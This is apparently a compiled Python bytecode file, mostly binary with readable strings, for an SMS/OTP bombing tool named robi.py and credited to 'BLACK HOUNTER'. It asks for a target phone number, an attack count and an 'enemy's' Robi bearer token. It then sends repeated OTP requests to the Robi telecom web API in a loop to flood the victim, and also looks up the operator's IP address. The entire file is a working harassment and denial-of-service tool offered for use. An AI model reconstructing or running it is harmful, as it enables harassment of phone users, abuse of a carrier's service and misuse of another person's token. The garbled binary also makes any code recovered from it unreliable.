o
    ��b'  �                   @   s4  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeee	d e
 ��Zeee	d e ��Zeee	d e
 ��Ze �d� eed � e�d�Zee	d � ee	d � eed e	 d e d � e�d� ee	de�� d � eed � eed � d dlZd dlmZ ed� dZe� Zde d  ed!< d"ed#< d$e d% ZdZe� Z de d  e d!< d"e d#< d$e d& Z!dZ"e� Z#de d  e#d!< d"e#d#< d$e d& Z$dZ%e� Z&de d  e&d!< d"e&d#< d$e d& Z'dZ(e� Z)de d  e)d!< d"e)d#< d$e d& Z*dZ+e� Z,de d  e,d!< d"e,d#< d$e d& Z-dZ.e� Z/de d  e/d!< d"e/d#< d$e d' Z0dZ1e� Z2de d  e2d!< d"e2d#< d$e d( Z3dZ4e� Z5de d  e5d!< d"e5d#< d$e d( Z6dZ7e� Z8de d  e8d!< d"e8d#< d$e d( Z9e:e�D ]~Z;zrej<eeed)�Z=ej<ee e!d)�Z=ej<e"e#e$d)�Z=ej<e%e&e'd)�Z=ej<e(e)e*d)�Z=ej<e+e)e-d)�Z=ej<e.e/e0d)�Z=ej<e1e2e3d)�Z=ej<e4e5e6d)�Z=ej<e7e8e9d)�Z=e�d*� eee;d+ g�e e=j> e d, e	 e e
 d- � W �q�   ed.� Y �q�dS )/�    N�clearzlolcat ban.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   g{�G�z�?)�sys�stdout�write�flush�time�sleep)ZjonyZword� r
   �robi.py�	logoprint   s
   
�r   z    Enter Target Number: z    Enter Attack Amount: z#
[>] ENTER YOUR ENEMYS ROBI TOKEN: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : BLACK HOUNTERz	 VERSION 	  : 2.2u   	 ♥♥z	 BLACK HOUNTER�   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz.https://webapi.robi.com.bd/v1/otp/send_requestzBearer � ZAuthorizationzapplication/jsonzContent-Typez{"phone_number":"zt","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}zt","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}zt","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}zt","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"})Zheaders�datag�����ư>�   z 
tAttack Number z& BLACK HOUNTER SiiR PiiN SenT HoYecHe
z)Please Make Sure Your Internet Connection)?�os�system�printZasyncior   Zrequestsr   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�inputZnumber�int�amount�token�getZresponser	   ZjsonZrequests.structuresr   Zurl1Zheaders1Zdata1Zurl2Zheaders2Zdata2Zurl3Zheaders3Zdata3Zurl4Zheaders4Zdata4Zurl5Zheaders5Zdata5Zurl6Zheaders6Zdata6Zurl7Zheaders7Zdata7Zurl8Zheaders8Zdata8Zurl9Zheaders9Zdata9Zurl10Z	headers10Zdata10�range�iZpost�x�textr
   r
   r
   r   �<module>   s�   





:�